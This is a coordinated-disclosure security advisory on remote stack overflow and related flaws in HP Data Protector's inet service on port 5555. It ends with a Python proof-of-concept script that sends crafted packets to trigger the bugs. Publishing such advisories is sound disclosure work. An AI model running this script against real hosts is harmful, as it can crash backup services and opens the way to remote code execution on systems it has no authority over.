  Multiple vulnerabilities in HP Data Protector


1. *Advisory Information*

Title: Multiple vulnerabilities in HP Data Protector
Advisory ID: CORE-2011-0514
Advisory URL:
http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities
Date published: 2011-06-29
Date of last update: 2011-06-29
Vendors contacted: HP
Release mode: Coordinated release


2. *Vulnerability Information*

Class: Remote stack overflow [CWE-120], Null pointer dereference
[CWE-476], Improper input validation [CWE-20]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2011-1865, CVE-2011-1514, CVE-2011-1515


3. *Vulnerability Description*

HP Data Protector [1] is an automated backup and recovery software for
single-server to enterprise environments. Multiple vulnerabilities have
been found in HP Data Protector that could allow a remote attacker to
execute arbitrary code and lead to denial of service conditions. The
vulnerabilities are triggered by sending a request to port 5555 of a
host running the "data protector inet" service, part of HP Data
Protector. The request has several parameters, including an opcode. By
sending requests with specially crafted parameters, the different bugs
can be triggered.


4. *Vulnerable packages*

   . HP OpenView Storage Data Protector v6.20 (running on Windows).
   . HP OpenView Storage Data Protector v6.11 (running on Windows).
   . HP OpenView Storage Data Protector v6.10 (running on Windows).
   . HP OpenView Storage Data Protector v6.00 (running on Windows).
   . Previous versions may be affected, but were not tested.


5. *Non-vulnerable packages*

   . No fixes are available at the time of publication.


6. *Vendor Information, Solutions and Workarounds*

HP has issued a security bulletin with document ID c02872182 [2]
available through HP Support Center at http://www.hp.com/go/HPSC.

The latest version of HP Data Protector is vulnerable to these issues.
HP has provided the following procedure to mitigate these vulnerabilities:

   1. Upgrade to Data Protector A.06.20 or subsequent.
   2. Enable encrypted control communication services on cell server and
all clients in cell.

 The upgrade is available for download from
http://hp.com/go/dataprotector then under 'Product Information' click on
'Trials and Demos'.


7. *Credits*

These vulnerabilities were discovered by Oren Isacson from Core Security
Technologies. Publication was coordinated by Carlos Sarraute.


8. *Technical Description / Proof of Concept Code*

The following python script can be used to reproduce the different bugs.

/-----
import struct, socket, sys

target        = sys.argv[1]
opcode        = sys.argv[2]
string_lenght = int(sys.argv[3])
args_number   = int(sys.argv[4])
long_argument = int(sys.argv[5])

def to_wc(x):
    return ''.join(["%s\x00" % c for c in x] )

args = [to_wc('a')] * args_number
args[5] = to_wc(opcode)
args[long_argument] = 'a' * string_lenght
packet = ["\xff\xfe\x32\x00\x00\x00"]

for s in args:
    packet.append("\x20\x00" + s + "\x00\x00")

packet = ''.join(packet)
packet = struct.pack(">L", len(packet)) + packet

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((target, 5555))
sock.send(packet)
